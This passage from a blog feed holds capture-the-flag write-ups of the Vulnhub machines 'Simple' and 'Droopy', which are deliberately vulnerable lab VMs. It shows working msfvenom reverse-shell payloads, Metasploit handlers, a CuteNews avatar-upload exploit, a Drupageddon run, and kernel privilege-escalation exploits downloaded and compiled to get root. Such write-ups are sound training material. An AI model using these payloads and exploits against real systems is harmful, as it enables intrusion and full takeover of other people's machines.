&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can easily see that SSH root login is disallowed, and that the user &lt;code&gt;user&lt;/code&gt;
and &lt;code&gt;ssh_user&lt;/code&gt; are allowed to connect to the server using SSH.&lt;/p&gt;
&lt;p&gt;As often with brute force, the major issue will be to build the dictionary but
some tools like &lt;a href="https://github.com/digininja/CeWL"&gt;CeWL&lt;/a&gt; from digininja can
help build it.&lt;/p&gt;</content><category term="cve"></category><category term="security"></category><category term="exploit"></category><category term="test"></category></entry><entry><title>Vulnhub SecTalks: BNE0x03 - Simple</title><link href="https://matthieukeller.com/2016/05/vulnhub-sectalks-bne0x03-simple.html" rel="alternate"></link><published>2016-05-11T19:55:00+02:00</published><updated>2016-05-11T19:55:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2016-05-11:/2016/05/vulnhub-sectalks-bne0x03-simple.html</id><summary type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2016.05/simple1.png" alt="Simple homepage" width="162"&gt;&lt;/p&gt;
&lt;p&gt;As droopy was not really hard and doesn't contain as much web vulnerability as I
would hope for, I tried an other VM
&lt;a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/"&gt;SecTalks: BNE0x03 - Simple&lt;/a&gt;
There were also hints on the description of the machine but with my resolution
they do not appear when just browsing the main page of vulnhub so I have not
spoiled myself with the hints this time.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2016.05/simple1.png" alt="Simple homepage" width="162"&gt;&lt;/p&gt;
&lt;p&gt;As droopy was not really hard and doesn't contain as much web vulnerability as I
would hope for, I tried an other VM
&lt;a href="https://www.vulnhub.com/entry/sectalks-bne0x03-simple,141/"&gt;SecTalks: BNE0x03 - Simple&lt;/a&gt;
There were also hints on the description of the machine but with my resolution
they do not appear when just browsing the main page of vulnhub so I have not
spoiled myself with the hints this time.&lt;/p&gt;


&lt;h2&gt;Discovery&lt;/h2&gt;
&lt;p&gt;Let's nmap the box to get some knowledge about it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@kalili:~# nmap 10.0.2.5 -p0-65535

Starting Nmap 7.12 ( https://nmap.org ) at 2016-05-11 15:42 CEST
Nmap scan report for 10.0.2.5
Host is up (0.00032s latency).
Not shown: 65535 closed ports
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 08:00:27:60:21:5C (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.60 seconds
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There seems once more that only the port 80 with a HTTP service is available.&lt;/p&gt;
&lt;h2&gt;Web&lt;/h2&gt;
&lt;p&gt;We go to the website. We notice that it is powered by CuteNews 2.0.3 (look at
the footer). We search on internet for vulnerability and found
&lt;a href="https://www.exploit-db.com/exploits/37474/"&gt;one&lt;/a&gt;.
This vulnerability allow the execute PHP code by uploading a malicious avatar.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Simple homepage" src="/media/2016.05/simple1.png"&gt;&lt;/p&gt;
&lt;p&gt;We create an account in order to upload our avatar.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Simple account page" src="/media/2016.05/simple2.png"&gt;&lt;/p&gt;
&lt;p&gt;We generate a PHP meterpreter using &lt;code&gt;msfvenom&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=4444 -e php/base64 -f raw &amp;amp;gt; /tmp/shell.php
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We prepare our metasploit for the callback:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msf &amp;amp;gt; use exploit/multi/handler
msf exploit(handler) &amp;amp;gt; set payload php/meterpreter/reverse_tcp
payload =&amp;amp;gt; php/meterpreter/reverse_tcp
msf exploit(handler) &amp;amp;gt; set LHOST 10.0.2.5
LHOST =&amp;amp;gt; 10.0.2.5
msf exploit(handler) &amp;amp;gt; set LPORT 4444
LPORT =&amp;amp;gt; 4444
msf exploit(handler) &amp;amp;gt; exploit
[*] Started reverse handler on 10.0.2.5:4444
[*] Starting the payload handler...
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We upload our msfvenom's payload as our avatar.&lt;/p&gt;
&lt;p&gt;We go to &lt;code&gt;http://10.0.2.5/uploads/avatar_john_shell.php&lt;/code&gt; and we got our
meterpreter!
Let's see what this box is made of:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;uname -a
Linux simple 3.16.0-30-generic #40~14.04.1-Ubuntu SMP Thu Jan 15 17:45:15 UTC 2015 i686 i686 i686 GNU/Linux
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Once more an Ubuntu 14.04, like the droopy from yesterday.&lt;/p&gt;
&lt;h2&gt;Privileges escalation&lt;/h2&gt;
&lt;h3&gt;CVE-2015-1328 exploiting overlayFS&lt;/h3&gt;
&lt;p&gt;Let us try once again to exploit the CVE-2015-1328 exploiting overlayFS to get
a root shell on the machine. I started a shell from the meterpreter, download
the exploit, compile it, run it and failed it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;meterpreter &amp;amp;gt; shell
Process 1335 created.
Channel 3 created.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
wget https://www.exploit-db.com/download/37292
--2016-05-11 09:59:52--  https://www.exploit-db.com/download/37292
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5123 (5.0K) [application/txt]
Saving to: &amp;#39;37292&amp;#39;

    0K .....                                                 100%  409M=0s

2016-05-11 09:59:53 (409 MB/s) - &amp;#39;37292&amp;#39; saved [5123/5123]

mv 37292 ofs.c
gcc ofs.c -o ofs
ls
avatar_john_shell.php
ofs
ofs.c
chmod +x ofs
./ofs
spawning threads
mount #1
mount #2
child threads done
exploit failed
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When searching for exploit regarding linux 3.16.0 I found the CVE-2014-5207:&lt;/p&gt;
&lt;h3&gt;CVE-2014-5207 Fuse-based exploit&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://www.exploit-db.com/exploits/34923/"&gt;CVE-2014-5207 Fuse-based exploit&lt;/a&gt;.
I download the exploit, compiled it and once more failed it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gcc -Wall fuse_suid.c `pkg-config fuse --cflags --libs` -o fuse_suid
/bin/sh: 1: pkg-config: not found
fuse_suid.c:21:18: fatal error: fuse.h: No such file or directory
#include &amp;amp;lt;fuse.h&amp;amp;gt;
                  ^
compilation terminated
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;When searching for &lt;code&gt;ubuntu 14.04 privilege escalation exploit&lt;/code&gt; I found two
interesting exploits :
 * CVE-2015-3643
 * CVE-2015-1318 + CVE-2015-1862&lt;/p&gt;
&lt;h3&gt;CVE-2015-3643&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://www.exploit-db.com/exploits/36820/"&gt;The CVE-2015-3643&lt;/a&gt; exploit the
D-Bus listening on com.ubuntu.USBCreator.
I try this exploit but the module was not available and failed:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;dbus-send --print-reply --system --dest=com.ubuntu.USBCreator /com/ubuntu/USBCreator com.ubuntu.USBCreator.KVMTest string:/dev/sda dict:string:string:DISPLAY,&amp;quot;foo&amp;quot;,XAUTHORITY,&amp;quot;foo&amp;quot;,LD_PRELOAD,&amp;quot;/tmp/test.so&amp;quot;
Error org.freedesktop.DBus.Error.ServiceUnknown: The name com.ubuntu.USBCreator was not provided by any .service files
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;CVE-2015-1318 + CVE-2015-1862&lt;/h3&gt;
&lt;p&gt;&lt;a href="https://www.exploit-db.com/exploits/36746/"&gt;The CVE-2015-1318 + CVE-2015-1862&lt;/a&gt;
exploit a feature in ubuntu 14.04 allowing a user to forward crash reports
(&lt;a href="http://exploiterz.blogspot.fr/2015/04/2015-cve-1318-leading-to-privilege.html"&gt;more informations here&lt;/a&gt;).
I download the exploit, compiled it with &lt;code&gt;-static&lt;/code&gt; and run it to get a root
shell on the box:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;meterpreter &amp;amp;gt; shell
Process 1550 created.
Channel 9 created.
cd /tmp/
wget https://www.exploit-db.com/download/36746
--2016-05-11 11:22:39--  https://www.exploit-db.com/download/36746
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5216 (5.1K) [application/txt]
Saving to: &amp;#39;36746&amp;#39;

    0K .....                                                 100%  337M=0s

2016-05-11 11:22:43 (337 MB/s) - &amp;#39;36746&amp;#39; saved [5216/5216]

mv 36746 newpid.c
gcc -static newpid.c
newpid.c:17:3: warning: #warning this file must be compiled with -static [-Wcpp]
# warning this file must be compiled with -static
  ^
./a.out
uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
id
uid=0(root) gid=33(www-data) groups=0(root),33(www-data)
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Conclusion&lt;/h2&gt;
&lt;p&gt;We just need to get our hands on the flag to finish it.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cat /root/flag.txt
U wyn teh Interwebs!!1eleven11!!1!
Hack the planet
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It was a nice box with still not so much web exploitation and only one exploit
to launch to get to root.
Thanks to &lt;a href="https://twitter.com/@RobertWinkel"&gt;Robert Winkel&lt;/a&gt; for the box and as
always to Vulnhub for their work.&lt;/p&gt;</content><category term="msfvenom"></category><category term="security"></category><category term="vulnhub"></category><category term="metasploit"></category></entry><entry><title>Vulnhub Droopy</title><link href="https://matthieukeller.com/2016/05/vulnhub-droopy.html" rel="alternate"></link><published>2016-05-10T21:49:00+02:00</published><updated>2016-05-10T21:49:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2016-05-10:/2016/05/vulnhub-droopy.html</id><summary type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2016.05/droopy.png" alt="Droopy homepage" width="162"&gt;
A few days ago, I installed a new pentesting box based on Arch Linux with Kali&lt;/p&gt;
&lt;p&gt;in a virtual machine. In order to test it I select a light vulnbox on vulnhub :
&lt;a href="https://www.vulnhub.com/entry/droopy-v02,143/"&gt;Droopy&lt;/a&gt;.
There were two hints on the description of the machine on the vulnhub download
page:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Grab a copy of the rockyou wordlist.&lt;/li&gt;
&lt;li&gt;It's fun to read other people's email.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;We will see how to use them in a moment :)&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2016.05/droopy.png" alt="Droopy homepage" width="162"&gt;
A few days ago, I installed a new pentesting box based on Arch Linux with Kali&lt;/p&gt;
&lt;p&gt;in a virtual machine. In order to test it I select a light vulnbox on vulnhub :
&lt;a href="https://www.vulnhub.com/entry/droopy-v02,143/"&gt;Droopy&lt;/a&gt;.
There were two hints on the description of the machine on the vulnhub download
page:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Grab a copy of the rockyou wordlist.&lt;/li&gt;
&lt;li&gt;It's fun to read other people's email.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;We will see how to use them in a moment :)&lt;/p&gt;


&lt;h2&gt;Discovery&lt;/h2&gt;
&lt;p&gt;Our nmap scan give us nothing but an open 80 port running a HTTP server.
Let's give a look to the website:&lt;/p&gt;
&lt;p&gt;&lt;img alt="Droopy homepage" src="/media/2016.05/droopy.png"&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="https://wappalyzer.com/"&gt;Wappalyzer&lt;/a&gt; give use the precise version of the Drupal
used (with the name and to logo of the VM it is easy to deduce that this is a
Drupal machine). The version is Drupal 7.0 which is vulnerable to CVE-2014-3704
also called
&lt;a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon"&gt;drupal_drupageddon&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Exploit&lt;/h2&gt;
&lt;p&gt;We use metasploit to directly have the Drupal exploit AND directly a
meterpreter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msf &amp;amp;gt; search drupal
[!] Module database cache not built yet, using slow search

Matching Modules
================

  Name                                           Disclosure Date  Rank       Description
  ----                                           ---------------  ----       -----------
  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Drupal OpenID External Entity Injection
  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Drupal Views Module Users Enumeration
  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  Drupal HTTP Parameter Key/Value SQL Injection
  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  PHP XML-RPC Arbitrary Code Execution
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We set the RHOST to the VM's IP address&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msf exploit(drupal_drupageddon) &amp;amp;gt; set RHOST 10.0.2.4
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We check our options&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;msf exploit(drupal_drupageddon) &amp;amp;gt; show options

Module options (exploit/multi/http/drupal_drupageddon):

  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOST      10.0.2.4         yes       The target address
  RPORT      80               yes       The target port
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The target URI of the Drupal installation
  VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

  Name   Current Setting  Required  Description
  ----   ---------------  --------  -----------
  LHOST  10.0.2.15        yes       The listen address
  LPORT  4444             yes       The listen port


Exploit target:

  Id  Name
  --  ----
  0   Drupal 7.0 - 7.31
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We launch our exploit against the server and praise for a reverse shell:
    msf exploit(drupal_drupageddon) &amp;gt; exploit&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;Started&lt;/span&gt; &lt;span class="nt"&gt;reverse&lt;/span&gt; &lt;span class="nt"&gt;TCP&lt;/span&gt; &lt;span class="nt"&gt;handler&lt;/span&gt; &lt;span class="nt"&gt;on&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;4444&lt;/span&gt;
&lt;span class="nt"&gt;Testing&lt;/span&gt; &lt;span class="nt"&gt;page&lt;/span&gt;
&lt;span class="nt"&gt;Creating&lt;/span&gt; &lt;span class="nt"&gt;new&lt;/span&gt; &lt;span class="nt"&gt;user&lt;/span&gt; &lt;span class="nt"&gt;ULMihKJWdb&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;giXrJOFefa&lt;/span&gt;
&lt;span class="nt"&gt;Logging&lt;/span&gt; &lt;span class="nt"&gt;in&lt;/span&gt; &lt;span class="nt"&gt;as&lt;/span&gt; &lt;span class="nt"&gt;ULMihKJWdb&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;giXrJOFefa&lt;/span&gt;
&lt;span class="nt"&gt;Trying&lt;/span&gt; &lt;span class="nt"&gt;to&lt;/span&gt; &lt;span class="nt"&gt;parse&lt;/span&gt; &lt;span class="nt"&gt;enabled&lt;/span&gt; &lt;span class="nt"&gt;modules&lt;/span&gt;
&lt;span class="nt"&gt;Enabling&lt;/span&gt; &lt;span class="nt"&gt;the&lt;/span&gt; &lt;span class="nt"&gt;PHP&lt;/span&gt; &lt;span class="nt"&gt;filter&lt;/span&gt; &lt;span class="nt"&gt;module&lt;/span&gt;
&lt;span class="nt"&gt;Setting&lt;/span&gt; &lt;span class="nt"&gt;permissions&lt;/span&gt; &lt;span class="nt"&gt;for&lt;/span&gt; &lt;span class="nt"&gt;PHP&lt;/span&gt; &lt;span class="nt"&gt;filter&lt;/span&gt; &lt;span class="nt"&gt;module&lt;/span&gt;
&lt;span class="nt"&gt;Getting&lt;/span&gt; &lt;span class="nt"&gt;tokens&lt;/span&gt; &lt;span class="nt"&gt;from&lt;/span&gt; &lt;span class="nt"&gt;create&lt;/span&gt; &lt;span class="nt"&gt;new&lt;/span&gt; &lt;span class="nt"&gt;article&lt;/span&gt; &lt;span class="nt"&gt;page&lt;/span&gt;
&lt;span class="nt"&gt;Calling&lt;/span&gt; &lt;span class="nt"&gt;preview&lt;/span&gt; &lt;span class="nt"&gt;page&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nt"&gt;Exploit&lt;/span&gt; &lt;span class="nt"&gt;should&lt;/span&gt; &lt;span class="nt"&gt;trigger&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;
&lt;span class="nt"&gt;Sending&lt;/span&gt; &lt;span class="nt"&gt;stage&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;33721&lt;/span&gt; &lt;span class="nt"&gt;bytes&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nt"&gt;to&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;4&lt;/span&gt;
&lt;span class="nt"&gt;Meterpreter&lt;/span&gt; &lt;span class="nt"&gt;session&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt; &lt;span class="nt"&gt;opened&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;4444&lt;/span&gt; &lt;span class="nt"&gt;-&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;10&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;4&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;52349&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nt"&gt;at&lt;/span&gt; &lt;span class="nt"&gt;2016-05-10&lt;/span&gt; &lt;span class="nt"&gt;16&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;56&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;46&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;0200&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Second hint&lt;/h2&gt;
&lt;p&gt;Okay it works, we got a meterperter with the user &lt;code&gt;www-data&lt;/code&gt;, let's follow the
hint a get a look to the e-mails:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;meterpreter ls /var/mail
Listing: /var/mail
==================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100777/rwxrwxrwx  564   fil   2016-04-14 20:32:01 +0200  www-data
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let's read the e-mails of www-data:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;From&lt;/span&gt; &lt;span class="nt"&gt;Dave&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;dave&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="k"&gt;droopy&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;example&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="nt"&gt;Wed&lt;/span&gt; &lt;span class="nt"&gt;Thu&lt;/span&gt; &lt;span class="nt"&gt;14&lt;/span&gt; &lt;span class="nt"&gt;Apr&lt;/span&gt; &lt;span class="nt"&gt;04&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;34&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;39&lt;/span&gt; &lt;span class="nt"&gt;2016&lt;/span&gt;
&lt;span class="nt"&gt;Date&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;14&lt;/span&gt; &lt;span class="nt"&gt;Apr&lt;/span&gt; &lt;span class="nt"&gt;2016&lt;/span&gt; &lt;span class="nt"&gt;04&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;34&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;39&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="nt"&gt;0100&lt;/span&gt;
&lt;span class="nt"&gt;From&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;Dave&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;dave&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="k"&gt;droopy&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;example&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;Subject&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;rockyou&lt;/span&gt; &lt;span class="nt"&gt;with&lt;/span&gt; &lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="nt"&gt;nice&lt;/span&gt; &lt;span class="nt"&gt;hat&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;
&lt;span class="nt"&gt;Message-ID&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;730262568&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="k"&gt;example&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;com&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="nt"&gt;X-IMAP&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;0080081351&lt;/span&gt; &lt;span class="nt"&gt;0000002016&lt;/span&gt;
&lt;span class="nt"&gt;Status&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;NN&lt;/span&gt;

&lt;span class="nt"&gt;George&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;

  &lt;span class="nt"&gt;I&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ve updated the encrypted file... You didn&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;t&lt;/span&gt; &lt;span class="nt"&gt;leave&lt;/span&gt; &lt;span class="nt"&gt;any&lt;/span&gt;
&lt;span class="nt"&gt;hints&lt;/span&gt; &lt;span class="nt"&gt;for&lt;/span&gt; &lt;span class="nt"&gt;me&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nt"&gt;The&lt;/span&gt; &lt;span class="nt"&gt;password&lt;/span&gt; &lt;span class="nt"&gt;isn&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;t longer than 11 characters&lt;/span&gt;
&lt;span class="s1"&gt;and anyway, we know what academy we went to, don&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;t&lt;/span&gt; &lt;span class="nt"&gt;you&lt;/span&gt;&lt;span class="o"&gt;...?&lt;/span&gt;

&lt;span class="nt"&gt;I&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;m sure you&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;ll&lt;/span&gt; &lt;span class="nt"&gt;figure&lt;/span&gt; &lt;span class="nt"&gt;it&lt;/span&gt; &lt;span class="nt"&gt;out&lt;/span&gt; &lt;span class="nt"&gt;it&lt;/span&gt; &lt;span class="nt"&gt;won&lt;/span&gt;&lt;span class="err"&gt;&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;t&lt;/span&gt; &lt;span class="nt"&gt;rockyou&lt;/span&gt; &lt;span class="nt"&gt;too&lt;/span&gt; &lt;span class="nt"&gt;much&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;

&lt;span class="nt"&gt;If&lt;/span&gt; &lt;span class="nt"&gt;you&lt;/span&gt; &lt;span class="nt"&gt;are&lt;/span&gt; &lt;span class="nt"&gt;still&lt;/span&gt; &lt;span class="nt"&gt;struggling&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;remember&lt;/span&gt; &lt;span class="nt"&gt;that&lt;/span&gt; &lt;span class="nt"&gt;song&lt;/span&gt; &lt;span class="nt"&gt;by&lt;/span&gt; &lt;span class="nt"&gt;The&lt;/span&gt; &lt;span class="nt"&gt;Jam&lt;/span&gt;

&lt;span class="nt"&gt;Later&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
&lt;span class="nt"&gt;Dave&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Privilege escalation&lt;/h2&gt;
&lt;p&gt;We need a privilege escalation. Like for
&lt;a href="http://matthieukeller.com/2015/06/vulnhub-fart-knocker.html#CVE-2015-1328"&gt;Fart-knocker&lt;/a&gt;
We can use the CVE-2015-1328 exploiting overlayFS to get a root shell on the
machine.&lt;/p&gt;
&lt;p&gt;We spawn a shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;meterpreter &amp;amp;gt; shell
Process 1233 created.
Channel 1 created.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We still have the permissions of &lt;code&gt;www-data&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We download the exploit &lt;code&gt;ofs.c&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;wget https://www.exploit-db.com/download/37292
--2016-05-10 15:58:12--  https://www.exploit-db.com/download/37292
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5123 (5.0K) [application/txt]
Saving to: &amp;#39;37292&amp;#39;

    0K .....                                                 100%  358M=0s

2016-05-10 15:58:12 (358 MB/s) - &amp;#39;37292&amp;#39; saved [5123/5123]
&lt;/pre&gt;&lt;/div&gt;


